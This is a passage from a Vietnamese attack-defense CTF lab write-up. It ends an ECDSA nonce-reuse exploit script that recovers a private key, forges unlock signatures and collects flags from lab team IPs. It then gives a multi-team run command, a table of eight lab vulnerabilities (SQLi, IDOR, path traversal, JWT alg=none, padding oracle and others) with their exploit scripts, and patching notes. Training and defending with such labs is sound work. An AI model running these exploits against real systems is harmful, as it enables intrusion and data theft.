    d = recover_private(host, port)
    out = []
    with Client(host, port) as c:
        for record in targets_of(c):
            signature = sign('unlock:' + record, d)        # tự ký, nonce rfc6979 mới
            resp = c.call(op='unlock', record=record, signature=signature)
            out.append((record, resp.get('flag') or resp.get('error') or str(resp)))
    return out

if __name__ == '__main__':
    if len(sys.argv) < 2: sys.exit('Dùng: python3 exploit_ecdsa.py <ip_doi> [port]')
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9013
    show('ecdsa_nonce', sys.argv[1], run(sys.argv[1], port))
```
```bash
python3 exploit_ecdsa.py 10.90.0.12
```

#### Vá
Bật `patched`: `nonce=None` ⇒ `sign` dùng **RFC 6979** (nonce tất định theo message, không lặp). Hai message khác nhau ⇒ khác `r` ⇒ không giải được `k`. Checker ký/verify bình thường nên UP.

> **Chạy cả 3 lỗ Crypto, nhiều đội một lượt:**
> `cd labs/full_rounds/round2/writeups/exploits && python3 exploit_all.py 10.90.0.11 10.90.0.12 10.90.0.13`

---

## Bảng tổng kết

| # | Lỗ | Điểm vào | Flag ở | Khai thác lõi | Script |
|---|---|---|---|---|---|
| 1 | SQLi UNION | `GET /collections/search?q=` | `collection_notes.note` | UNION 3 cột sang bảng note | `sqli.py` |
| 2 | IDOR | `GET /account/orders/<id>/invoice` | `orders.memo` | Đổi id đơn, không kiểm chủ | `idor.py` |
| 3 | Path traversal | `POST /outfits/new` preview_file | `private/<token>.json` | `../` trong simulation (cần token) | `upload.py` |
| 4 | JWT alg=none | cookie `meko_member` | `vip_offers.code` | Rèn token rank c-nocturne, sig rỗng | `jwt.py` |
| 5 | Lộ backup | `GET /exports/operations.sql` | `reconciliation_notes.value` | Tải thẳng, không cần quyền | `backup.py` |
| 6 | Curveball | 9011 op `read` | record của service | generator = Q ⇒ d=1, ký admin | `exploit_curveball.py` |
| 7 | Padding oracle | 9012 op `decrypt` | record của service | oracle `padding` vs `content` | `exploit_padding_oracle.py` |
| 8 | ECDSA nonce | 9013 op `sign`/`unlock` | record của service | nonce lặp ⇒ lộ d ⇒ tự ký unlock | `exploit_ecdsa.py` |

**Nguyên tắc vá chung:** mỗi lỗ có sẵn nhánh `patched`. Vá = bật đúng nhánh đó (sửa mã trên VM, ghi `patches.json` cho Web hoặc `PATCHED=1` cho Crypto, rồi restart dịch vụ của đội). **Giữ chức năng hợp lệ** để checker UP — đừng gỡ route hay chặn cứng input, sẽ mất SLA.

**Lưu ý nghiệm chứng:** writeup bám theo **code hiện tại** `labs/full_rounds/`; chưa chạy lại trên sandbox thật trong đợt này (Docker/pool tắt). Khi có môi trường, nên chạy lại script trong `writeups/exploits/` để xác nhận. Các lệnh `curl`/`ncat`/REPL ở phần thủ công là để hiểu cơ chế; phần nặng (padding oracle 16 byte/khối) nên dùng script.
